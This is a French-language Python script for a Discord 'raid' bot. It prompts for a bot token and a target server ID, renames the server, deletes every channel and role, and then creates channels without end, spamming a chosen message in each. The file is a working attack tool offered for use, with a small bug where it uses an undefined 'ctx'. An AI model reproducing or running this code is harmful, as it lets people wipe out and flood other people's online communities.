try:
	import os
	import discord
	from discord.ext import commands
	from colorama import Back, Fore, Style, deinit, init
except:
	print("Module manquant !")
	try:
		os.system("pip install -r requirements.txt")
	except:
		print("Impossible d'installer les modules")
		quit()

try:
	os.system("/usr/bin/clear")
except:
	try:
		os.system("cls")
	except:
		pass

print(Fore.RED + Style.NORMAL + """
			Script développé par zako#7777

                              /$$       /$$                              
                             |__/      | $$                              
 /$$$$$$$$  /$$$$$$  /$$$$$$  /$$  /$$$$$$$  /$$$$$$  /$$   /$$  /$$$$$$ 
|____ /$$/ /$$__  $$|____  $$| $$ /$$__  $$ /$$__  $$| $$  | $$ /$$__  $$
   /$$$$/ | $$  \__/ /$$$$$$$| $$| $$  | $$| $$$$$$$$| $$  | $$| $$  \__/
  /$$__/  | $$      /$$__  $$| $$| $$  | $$| $$_____/| $$  | $$| $$      
 /$$$$$$$$| $$     |  $$$$$$$| $$|  $$$$$$$|  $$$$$$$|  $$$$$$/| $$      
|________/|__/      \_______/|__/ \_______/ \_______/ \______/ |__/   
                                        """)

token = input(Fore.BLUE + Style.NORMAL + "\nToken de votre bot: ")
idserveur = input(Fore.BLUE + Style.NORMAL + "Id du serveur a raid: ")
nomserveur = input(Fore.BLUE + Style.NORMAL + "Nouveau nom du serveur: ")
nomchannel = input(Fore.BLUE + Style.NORMAL + "Nom des channel: ")
messagespam = input(Fore.BLUE + Style.NORMAL + "Message a spam dans les channel: ")

bot = commands.Bot(command_prefix="+", intents=discord.Intents.all())

@bot.event
async def on_ready():
	try:
		os.system("/usr/bin/clear")
	except:
		try:
			os.system("cls")
		except:
			pass
	print(Fore.BLUE + Style.NORMAL + """
	  ____   ___ _____   _____ _   _   __  __    _    ____   ____ _   _ _____ 
	 | __ ) / _ \_   _| | ____| \ | | |  \/  |  / \  |  _ \ / ___| | | | ____|
	 |  _ \| | | || |   |  _| |  \| | | |\/| | / _ \ | |_) | |   | |_| |  _|  
	 | |_) | |_| || |   | |___| |\  | | |  | |/ ___ \|  _ <| |___|  _  | |___ 
	 |____/ \___/ |_|   |_____|_| \_| |_|  |_/_/   \_\_| \_\\____|_| |_|_____|
	                                                                          
		                 """+ Fore.RED + Style.NORMAL + "ROUGE = Channel supprimé\n"+ Fore.GREEN + Style.NORMAL + "                                  VERT = role supprimé\n"+ Fore.BLUE + Style.NORMAL + Fore.CYAN + Style.NORMAL + "                                  CYAN = role supprimé\n"+ Fore.BLUE + Style.NORMAL +"LOGS:\n")
	guild = bot.get_guild(int(idserveur))
	
	try:
		await ctx.guild.edit(name=nomserveur)
	except:
		print(Fore.CYAN + Style.NORMAL + "Erreur: Impossible de modifié le nom du serveur")
	
	for channel in guild.channels:
		try:
			await channel.delete()
			print(Fore.RED + Style.NORMAL + "Channel: "+channel.name+" supprimé")
		except:
			print(Fore.CYAN + Style.NORMAL + "Erreur: Impossible de supprimé le channel: "+channel.name)
	
	for role in guild.roles:
		try:
			await role.delete()
		except:
			print(Fore.CYAN + Style.NORMAL + "Erreur: Impossible de supprimé le role: "+role.name)
	
	while True:
		channel = await guild.create_text_channel(nomchannel)
		await channel.send(messagespam)

bot.run(token)
